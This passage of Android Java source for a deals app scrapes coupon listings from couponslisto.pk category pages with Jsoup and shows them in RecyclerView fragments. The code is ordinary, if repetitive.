        View v =  inflater.inflate(R.layout.fragment_home_garden, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new HomeGarden(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }
}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class Food extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/food-restaurants/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public Food(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;

/**
 * Created by Muhammad Haseeb on 2/18/2017.
 */

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class ClothingDeals extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    int count = 1;
    //private String BaseURl = "http://couponslisto.pk/deals/newest/";
    private String htmlPageUrl = "http://couponslisto.pk/category/clothing-accessories/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public ClothingDeals(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
                htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
                Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
                Elements cardItems = ul.select("li");
                for (Element link : cardItems) {
                    Elements title = link.select("h4[class=widget-title]");
                    Elements desc = link.select("p[class=widget-metas type-link]");
                    Elements img = link.select("img[class=cover-image]");
                    list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
                }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class ElectF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;
    public ElectF() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_elect, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new Electronics(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }

}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;


import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class GiftsBooksF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public GiftsBooksF() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_gift_books, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new GiftBooks(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }

}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;


import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class ToysF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public ToysF() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_toys, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        c = getActivity();
        new Toys(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }
}


package hsblabs.dealsmash;


import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;



import java.util.ArrayList;
import java.util.List;


/**
 * A simple {@link Fragment} subclass.
 */
public class OfficeF extends Fragment {

    RecyclerView recyclerView;
    Context c;
    private DealsAdapter adapter;
    public List<Object> dList;

    public OfficeF() {
        // Required empty public constructor
    }


        @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v =  inflater.inflate(R.layout.fragment_office, container, false);
        dList = new ArrayList<Object>();
        recyclerView = (RecyclerView) v.findViewById(R.id.recycler_view);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(c);
        //mLayoutManager.setReverseLayout(true);
        //mLayoutManager.setStackFromEnd(true);
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
            c = getActivity();
        new Office(
                new ListFetcher.OnDataloadListListener(){
                    @Override
                    public void onDataloadListReady(List<Object> list) {
                        dList = list;
                        dList.size();
                        adapter = new DealsAdapter(c, dList);
                        recyclerView.setAdapter(adapter);
                    }
                }
                ,c).execute();
        return v;
    }

}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class Office extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/office/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public Office(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class Travel extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/category/travel/deals";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public Travel(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        dialog = new ProgressDialog(c);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
        dialog.setIndeterminate(true);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
            htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
            Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
            Elements cardItems = ul.select("li");
            for (Element link : cardItems) {
                Elements title = link.select("h4[class=widget-title]");
                Elements desc = link.select("p[class=widget-metas type-link]");
                Elements img = link.select("img[class=cover-image]");
                list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


package hsblabs.dealsmash;

import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Muhammad Haseeb on 2/17/2017.
 */

public class AllDeals extends AsyncTask<Void,Void,Void> {
    ProgressDialog dialog ;
    Context c;
    private Document htmlDocument;
    private String htmlPageUrl = "http://couponslisto.pk/deals/newest/";
    List<Object> list = new ArrayList<Object>();
    ListFetcher.OnDataloadListListener onDataloadListListener;

    public AllDeals(ListFetcher.OnDataloadListListener onDataloadListListener,Context c){
        this.onDataloadListListener = onDataloadListListener;
        this.c =  c ;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
            dialog = new ProgressDialog(c);
            dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            dialog.setMessage("Fetching the best deals for you.\nPlease wait...");
            dialog.setIndeterminate(true);
            dialog.setCanceledOnTouchOutside(false);
            dialog.show();
    }

    @Override
    protected Void doInBackground(Void... params) {
        try {
                htmlDocument = Jsoup.connect(htmlPageUrl).timeout(10000).get();
                Elements ul = htmlDocument.select("ul[class=blocks blocks-100 blocks-xlg-3 blocks-lg-3 blocks-md-2 blocks-sm-1 masonry-container]");
                Elements cardItems = ul.select("li");
                for (Element link : cardItems) {
                    Elements title = link.select("h4[class=widget-title]");
                    Elements desc = link.select("p[class=widget-metas type-link]");
                    Elements img = link.select("img[class=cover-image]");
                    list.add(new DealItem(title.text(),img.attr("abs:src").toString(),desc.text(),"null"));
                }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(Void result) {

        dialog.dismiss();
        if(onDataloadListListener != null){
            onDataloadListListener.onDataloadListReady(list);
        }
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) c.getSystemService(c.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}


